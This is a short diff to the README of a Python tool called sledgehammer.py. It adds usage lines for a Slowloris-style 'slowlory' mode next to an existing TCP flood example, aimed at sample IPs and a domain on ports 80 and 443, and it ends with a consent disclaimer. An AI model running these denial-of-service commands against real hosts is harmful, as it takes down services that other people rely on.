@@ -52,5 +52,10 @@ Default source MAC and IP address is the one of the interface given by 'iface_na
 
   `python sledgehammer.py --mode tcp --iface_name wlan1 --mac_dst 00:11:22:33:44:55:66 --ip_dst 193.99.144.80 --port_dst 443`
 
+- Slowlory
+
+  `python sledgehammer.py -m slowlory --ip_dst 1.2.3.4 --port_dst 80  -i wlan0`
+  `python sledgehammer.py -m slowlory --ip_dst www.domain.com --port_dst 443 --ssl True -i wlan0`
+
 ### Disclaimer
 Use at your own risk. Do not use without full consent of everyone involved.
